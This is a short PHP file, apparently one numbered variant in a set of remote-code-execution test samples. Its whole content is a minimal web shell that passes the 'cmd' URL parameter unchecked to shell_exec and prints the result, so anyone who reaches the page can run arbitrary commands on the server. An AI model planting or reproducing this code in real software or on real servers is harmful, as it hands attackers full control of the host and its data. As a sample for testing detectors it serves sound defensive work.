<?php
// RCE test variation #1294
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>